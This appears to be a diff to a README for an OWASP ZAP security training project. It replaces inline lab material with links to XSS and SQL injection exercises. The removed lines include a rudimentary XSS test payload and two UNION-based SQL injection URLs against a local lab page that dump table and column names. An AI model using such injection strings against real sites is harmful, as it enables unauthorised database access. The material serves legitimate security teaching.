@@ -1,21 +1,9 @@
 # Owasp Zap testing
 
-## Run web application
-```
-./script/build.sh
-./script/deploy.sh
-```
 
-## Payload to exploit xss
-```
-<img src=trung alert("hello world") />
-```
-
-## Payload to exploit sql injection by union with information schema
-```
-Dump all tables: http://0.0.0.0/sqliUnion.php?id=11+union+select+1,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database() 
-Dump all columns in table: http://0.0.0.0/sqliUnion.php?id=11+union+select+1,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27
-```
+## Labs
+- [1 XSS](https://bitbucket.org/devops-vl/owasp-ci-integration-demo/src/master/training/001_xss/README.md)
+- [2 SQLi](https://bitbucket.org/devops-vl/owasp-ci-integration-demo/src/master/training/002_sqlinjection/README.md)
 
 ## Environment to practice 
 ```
